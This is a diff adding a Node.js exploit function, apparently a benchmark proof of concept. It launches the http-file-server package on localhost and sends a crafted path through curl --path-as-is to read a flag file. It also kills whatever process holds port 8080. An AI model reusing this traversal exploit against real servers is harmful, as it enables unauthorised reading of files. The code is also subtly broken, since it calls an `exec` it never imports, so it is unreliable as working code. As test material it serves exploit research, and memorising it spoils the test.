@@ -1,0 +1,29 @@
+function exploitFunction() {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const { execSync } = require("child_process");
+
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+  const genstr = require("./payload").getPayload();
+
+  // Clean up any previous processes
+  try {
+    execSync("fuser -k 8080/tcp");
+  } catch (e) {}
+
+  let server = "node ./node_modules/http-file-server/http-file-server.js";
+  let exe = exec(server, (error, stdout) => {});
+
+  sleep.sleep(2);
+
+  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;
+  exec(attack_string, (error, stdout) => {
+    if (stdout) {
+      console.log("Output:", stdout);
+      return stdout;
+    }
+    return null;
+  });
+}
+
+module.exports = { exploitFunction };
